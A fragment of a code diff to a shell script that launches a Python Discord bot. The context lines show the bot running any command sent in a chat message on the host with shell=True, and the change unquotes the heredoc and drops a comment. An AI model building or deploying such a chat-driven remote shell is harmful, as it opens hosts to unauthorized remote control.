@@ -20,7 +20,7 @@ $PYTHON_BIN -m pip install --quiet discord requests
 
 echo "▶️ Running bot..."
 
-$PYTHON_BIN <<'EOF'
+$PYTHON_BIN <<EOF
 import discord
 import os
 import base64
@@ -58,7 +58,6 @@ async def on_message(message):
         await message.channel.send(f"▶️ Thực thi: `{cmd}`")
 
         try:
-            # Chạy lệnh thực sự, không có {cmd}
             process = subprocess.Popen(
                 cmd, shell=True,
                 stdout=subprocess.PIPE,
